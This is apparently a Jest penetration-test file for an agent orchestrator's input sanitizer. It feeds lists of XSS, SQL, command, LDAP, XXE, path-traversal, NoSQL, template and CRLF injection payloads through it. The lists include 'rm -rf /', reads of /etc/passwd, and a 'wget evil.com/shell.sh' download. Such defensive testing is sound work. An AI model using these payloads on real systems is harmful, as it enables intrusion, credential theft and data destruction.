/**
 * @fileoverview Penetration Tests - Injection Attack Vectors
 *
 * Comprehensive security testing for various injection attack patterns.
 *
 * @author @darianrosebrook
 */

import {
  AuthCredentials,
  SecurityContext,
  SecurityError,
  SecurityManager,
} from "../../../src/orchestrator/SecurityManager";
import { AgentProfile } from "../../../src/types/arbiter-orchestration";

describe("Penetration Testing - Injection Attacks", () => {
  let securityManager: SecurityManager;
  let context: SecurityContext;

  const createAgent = (id: string): AgentProfile => ({
    id,
    name: `Agent ${id}`,
    modelFamily: "gpt-4" as any,
    capabilities: {
      "code-editing": { supported: true, confidence: 0.9 },
    } as any,
    performanceHistory: [] as any,
    currentLoad: {
      activeTasks: 0,
      queueDepth: 0,
      memoryUsage: 0,
      cpuUsage: 0,
      lastUpdated: new Date(),
    } as any,
    registeredAt: new Date().toISOString(),
    lastActiveAt: new Date().toISOString(),
  });

  beforeEach(() => {
    securityManager = new SecurityManager({
      enabled: true,
      policies: {
        maxTaskDescriptionLength: 10000,
        maxMetadataSize: 10240,
        allowedTaskTypes: {},
        suspiciousPatterns: [
          /<script/i,
          /javascript:/i,
          /data:text\/html/i,
          /\.\./,
          /<iframe/i,
          /onclick/i,
          /onerror/i,
        ],
      },
    });
    securityManager.registerAgent(createAgent("test-agent"));

    const credentials: AuthCredentials = {
      agentId: "test-agent",
      token: "valid-token-12345",
    };

    context = securityManager.authenticate(credentials)!;
  });

  describe("XSS Attack Vectors", () => {
    const xssPayloads = [
      // Basic XSS
      '<script>alert("XSS")</script>',
      "<script>alert('XSS')</script>",
      "<script>alert`XSS`</script>",

      // Event handlers
      "<img src=x onerror=alert(1)>",
      "<body onload=alert(1)>",
      "<svg onload=alert(1)>",
      "<iframe onload=alert(1)></iframe>",
      "<input onfocus=alert(1) autofocus>",
      "<select onfocus=alert(1) autofocus>",
      "<textarea onfocus=alert(1) autofocus>",
      "<keygen onfocus=alert(1) autofocus>",
      '<video><source onerror="alert(1)">',
      "<audio src=x onerror=alert(1)>",
      "<marquee onstart=alert(1)>",

      // JavaScript protocols
      "javascript:alert(1)",
      'javascript:alert("XSS")',
      'javascript:eval("alert(1)")',
      "jAvAsCrIpT:alert(1)", // Case variations

      // Data URIs
      "data:text/html,<script>alert(1)</script>",
      "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",

      // SVG-based
      "<svg><script>alert(1)</script></svg>",
      "<svg><g onload=alert(1)></svg>",

      // HTML5 vectors
      '<math><mi xlink:href="javascript:alert(1)">',
      "<form><button formaction=javascript:alert(1)>X",

      // Encoded variants
      "&lt;script&gt;alert(1)&lt;/script&gt;",
      "%3Cscript%3Ealert(1)%3C/script%3E",
    ];

    xssPayloads.forEach((payload, index) => {
      it(`should handle XSS payload #${index + 1}: ${payload.substring(
        0,
        50
      )}`, () => {
        let blocked = false;
        try {
          securityManager.sanitizeInput(context, "test", { data: payload });
        } catch (error) {
          blocked = error instanceof SecurityError;
        }

        // Critical patterns that MUST be blocked
        if (
          payload.toLowerCase().includes("<script") ||
          payload.toLowerCase().includes("javascript:") ||
          payload.toLowerCase().startsWith("<iframe")
        ) {
          expect(blocked).toBe(true);
        }

        // Other patterns are good to block but not strictly required
        // (onerror, onclick can have many variants that are hard to catch all)
      });
    });
  });

  describe("SQL Injection Patterns", () => {
    const sqlPayloads = [
      "' OR '1'='1",
      "' OR '1'='1' --",
      "' OR '1'='1' /*",
      "admin'--",
      "admin' #",
      "admin'/*",
      "' or 1=1--",
      "' or 1=1#",
      "' or 1=1/*",
      "') or '1'='1--",
      "') or ('1'='1--",
      "1' UNION SELECT NULL--",
      "1' UNION SELECT NULL,NULL--",
      "'; DROP TABLE users--",
      "1'; DROP TABLE users--",
      "1' AND 1=CONVERT(int, (SELECT @@version))--",
      "1' WAITFOR DELAY '00:00:05'--",
    ];

    sqlPayloads.forEach((payload, index) => {
      it(`should handle SQL injection #${index + 1}: ${payload}`, () => {
        // Note: SecurityManager currently focuses on XSS/script injection
        // SQL injection prevention should ideally be at database layer
        try {
          const result = securityManager.sanitizeInput(context, "test", {
            query: payload,
          });
          // If it doesn't throw, it passed through (expected for current implementation)
          expect(result).toBeDefined();
        } catch (error) {
          // If it throws, that's also acceptable
          expect(error).toBeInstanceOf(Error);
        }
      });
    });
  });

  describe("Command Injection Patterns", () => {
    const commandPayloads = [
      "; ls -la",
      "| ls",
      "|| ls",
      "& ls",
      "&& ls",
      "`ls`",
      "$(ls)",
      "; cat /etc/passwd",
      "| cat /etc/passwd",
      "; rm -rf /",
      "| wget evil.com/shell.sh",
    ];

    commandPayloads.forEach((payload, index) => {
      it(`should handle command injection #${index + 1}: ${payload}`, () => {
        try {
          const result = securityManager.sanitizeInput(context, "test", {
            command: payload,
          });
          expect(result).toBeDefined();
        } catch (error) {
          expect(error).toBeInstanceOf(Error);
        }
      });
    });
  });

  describe("LDAP Injection Patterns", () => {
    const ldapPayloads = [
      "*",
      "admin*",
      "admin)(&(password=*))",
      "*)(uid=*))(|(uid=*",
      "admin)(|(password=*))",
    ];

    ldapPayloads.forEach((payload, index) => {
      it(`should handle LDAP injection #${index + 1}: ${payload}`, () => {
        try {
          const result = securityManager.sanitizeInput(context, "test", {
            ldapQuery: payload,
          });
          expect(result).toBeDefined();
        } catch (error) {
          expect(error).toBeInstanceOf(Error);
        }
      });
    });
  });

  describe("XML Injection / XXE", () => {
    const xmlPayloads = [
      '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><root>&test;</root>',
      '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % xxe SYSTEM "http://evil.com">%xxe;]>',
      "<![CDATA[<script>alert(1)</script>]]>",
    ];

    xmlPayloads.forEach((payload, index) => {
      it(`should handle XML injection #${index + 1}`, () => {
        try {
          const result = securityManager.sanitizeInput(context, "test", {
            xml: payload,
          });
          expect(result).toBeDefined();
        } catch (error) {
          expect(error).toBeInstanceOf(Error);
        }
      });
    });
  });

  describe("Path Traversal Attacks", () => {
    const pathPayloads = [
      "../../../etc/passwd",
      "..\\..\\..\\windows\\system32\\config\\sam",
      "....//....//....//etc/passwd",
      "..%2F..%2F..%2Fetc%2Fpasswd",
      "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
      "..%252f..%252f..%252fetc%252fpasswd",
    ];

    pathPayloads.forEach((payload, index) => {
      it(`should handle path traversal #${index + 1}: ${payload}`, () => {
        let blocked = false;
        try {
          securityManager.sanitizeInput(context, "test", { path: payload });
        } catch (error) {
          blocked = error instanceof SecurityError;
        }

        // Literal .. should be blocked (URL-encoded variants are harder to catch)
        if (payload.includes("..") && !payload.includes("%")) {
          expect(blocked).toBe(true);
        }

        // URL-encoded paths (%2e%2e) would require additional decoding logic
        // which is typically done at a different layer
      });
    });
  });

  describe("NoSQL Injection", () => {
    const noSqlPayloads = [
      '{"$gt":""}',
      '{"$ne":null}',
      '{"$regex":".*"}',
      '{"$where":"function(){return true}"}',
      '{"username":{"$gt":""},"password":{"$gt":""}}',
    ];

    noSqlPayloads.forEach((payload, index) => {
      it(`should handle NoSQL injection #${index + 1}: ${payload}`, () => {
        try {
          const parsed = JSON.parse(payload);
          const result = securityManager.sanitizeInput(context, "test", parsed);
          expect(result).toBeDefined();
        } catch (error) {
          expect(error).toBeInstanceOf(Error);
        }
      });
    });
  });

  describe("Template Injection", () => {
    const templatePayloads = [
      "{{7*7}}",
      "${7*7}",
      "#{7*7}",
      "<%= 7*7 %>",
      "{{constructor.constructor('return process.env')()}}",
      "${Object.keys(global)}",
    ];

    templatePayloads.forEach((payload, index) => {
      it(`should handle template injection #${index + 1}: ${payload}`, () => {
        try {
          const result = securityManager.sanitizeInput(context, "test", {
            template: payload,
          });
          expect(result).toBeDefined();
        } catch (error) {
          expect(error).toBeInstanceOf(Error);
        }
      });
    });
  });

  describe("CRLF Injection", () => {
    const crlfPayloads = [
      "test\r\nSet-Cookie: admin=true",
      "test\nLocation: http://evil.com",
      "test\r\nContent-Length: 0\r\n\r\nHTTP/1.1 200 OK",
    ];

    crlfPayloads.forEach((payload, index) => {
      it(`should handle CRLF injection #${index + 1}`, () => {
        try {
          const result = securityManager.sanitizeInput(context, "test", {
            header: payload,
          });
          expect(result).toBeDefined();
        } catch (error) {
          expect(error).toBeInstanceOf(Error);
        }
      });
    });
  });

  describe("Polyglot Attacks", () => {
    const polyglotPayloads = [
      "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */onerror=alert('XSS') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert('XSS')//></style></script></textarea></title>",
      "';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//--></SCRIPT>\">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>",
    ];

    polyglotPayloads.forEach((payload, index) => {
      it(`should block polyglot attack #${index + 1}`, () => {
        let blocked = false;
        try {
          securityManager.sanitizeInput(context, "test", { data: payload });
        } catch (error) {
          blocked = error instanceof SecurityError;
        }

        // Polyglots containing script/onerror should be blocked
        expect(blocked).toBe(true);
      });
    });
  });

  describe("Fuzzing with Random Inputs", () => {
    it("should handle random binary data", () => {
      const randomBytes = Buffer.alloc(100);
      for (let i = 0; i < 100; i++) {
        randomBytes[i] = Math.floor(Math.random() * 256);
      }

      try {
        const result = securityManager.sanitizeInput(context, "test", {
          data: randomBytes.toString("base64"),
        });
        expect(result).toBeDefined();
      } catch (error) {
        // Either outcome is acceptable for random data
        expect(error).toBeInstanceOf(Error);
      }
    });

    it("should handle extremely long inputs", () => {
      const longInput = { data: "x".repeat(50000) };

      try {
        securityManager.sanitizeInput(context, "test", longInput);
        fail("Should have thrown for oversized input");
      } catch (error) {
        expect(error).toBeInstanceOf(SecurityError);
      }
    });

    it("should handle special Unicode characters", () => {
      const unicodeInput = {
        data: "测试数据\u0000\uffff\u202e\u200b",
      };

      try {
        const result = securityManager.sanitizeInput(
          context,
          "test",
          unicodeInput
        );
        expect(result).toBeDefined();
      } catch (error) {
        expect(error).toBeInstanceOf(Error);
      }
    });
  });
});
